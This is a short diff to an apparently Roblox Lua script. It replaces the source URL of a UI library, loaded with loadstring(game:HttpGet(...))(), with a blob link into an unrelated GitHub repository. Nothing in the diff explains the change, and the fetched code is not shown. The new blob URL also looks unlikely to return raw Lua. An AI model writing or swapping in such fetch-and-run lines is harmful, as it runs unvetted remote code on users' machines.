@@ -54,7 +54,7 @@ State.Mirror = Mirror
 State.ScriptLoader = ScriptLoader
 
 local ok, WindUI = pcall(function()
-    return loadstring(game:HttpGet("https://raw.githubusercontent.com/Footagesus/WindUI/main/dist/main.lua"))()
+    return loadstring(game:HttpGet("https://github.com/cheng2026-tech/fictional-funicular/blob/43060d508beb412825f9f523b6fd92a92b23195f/%E5%A4%A7%E8%82%A5%E9%B1%BC%E6%A8%A1%E5%9D%97.lua"))()
 end)
 if not ok or not WindUI then return end
 
